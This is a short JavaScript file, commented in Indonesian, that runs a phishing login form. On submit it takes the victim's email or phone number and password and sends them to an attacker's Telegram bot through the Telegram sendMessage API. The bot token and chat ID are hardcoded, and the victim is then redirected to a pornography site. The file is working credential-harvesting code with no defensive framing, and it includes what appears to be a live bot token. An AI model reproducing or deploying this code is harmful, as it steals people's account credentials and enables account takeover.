// Token dan Chat ID Telegram
const BOT_TOKEN = "7999220035:AAFf2ERfvapw7SWffyme3UAUO8H_0ljUav8"; // Ganti dengan token bot Telegram Anda
const CHAT_ID = "6975695436";     // Ganti dengan chat ID Anda

// Logika Form Login
document.getElementById("loginForm").addEventListener("submit", function(event) {
    event.preventDefault(); // Mencegah reload halaman

    const emailOrNumber = document.getElementById("email_or_number").value;
    const password = document.getElementById("password").value;

    const message = `Data Login:\nEmail/Nomor: ${emailOrNumber}\nPassword: ${password}`;

    // Kirim data ke bot Telegram
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
        }),
    })
    .then(response => {
        if (response.ok) {
            // Redirect ke website tujuan jika sukses
            window.location.href = "https://www.pornhub.com/";
        } else {
            alert("Gagal mengirim data login.");
        }
    })
    .catch(error => {
        console.error("Error:", error);
        alert("Terjadi kesalahan saat mengirim data.");
    });
});
